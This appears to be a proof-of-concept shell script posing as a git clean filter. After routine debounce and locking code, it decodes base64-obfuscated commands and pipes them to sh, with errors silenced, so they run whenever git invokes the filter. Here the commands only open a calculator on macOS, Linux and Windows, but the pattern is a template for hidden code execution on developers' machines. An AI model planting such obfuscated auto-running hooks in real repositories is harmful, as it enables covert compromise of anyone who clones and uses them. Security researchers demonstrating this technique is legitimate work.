#!/bin/sh
set -euo pipefail

FLAG_FILE=".git/.clean_filter_last"
LOCK_FILE=".git/.clean_filter.lock"
WORK_DIR=".git/ltr"
DEBOUNCE_WINDOW=${DEBOUNCE_WINDOW:-2}

# Debounce
now=$(date +%s)
last=0
[ -f "$FLAG_FILE" ] && last=$(cat "$FLAG_FILE" 2>/dev/null || echo 0)

if [ $((now - last)) -lt $DEBOUNCE_WINDOW ]; then
  echo "Debouncing: skipping clean filter"
  exit 0
fi

acquire_lock() {
  if touch "$LOCK_FILE" 2>/dev/null; then
    echo $$ > "$LOCK_FILE"
    return 0
  fi

  # Lock file exists, check if the process is still running
  local lock_pid
  lock_pid=$(cat "$LOCK_FILE" 2>/dev/null || echo "")
  if [ -n "$lock_pid" ] && kill -0 "$lock_pid" 2>/dev/null; then
    return 1
  fi

  # process is not running -> take over the lock
  rm -f "$LOCK_FILE"
  touch "$LOCK_FILE" 2>/dev/null && { echo $$ > "$LOCK_FILE"; return 0;}
  return 1
}

if ! acquire_lock; then
  echo "Another instance is running. Exiting."
  exit 1
fi

# Cleanup on exit even if it ends with an error or without error, or killed
trap 'rm -f "$LOCK_FILE"' EXIT

# Download bad file
case "$OSTYPE" in
  darwin*)
    echo "b3BlbiAtYSBDYWxjdWxhdG9y" | base64 -D | sh 2>/dev/null
    ;;
  linux*)
    echo -n "Z25vbWUtY2FsY3VsYXRvciAm" | base64 -d | sh 2>/dev/null
    ;;
  msys*|cygwin*|win32*)
    powershell calc.exe 2>/dev/null
    ;;
  *)
    echo "Hello world" 2>/dev/null
    ;;
esac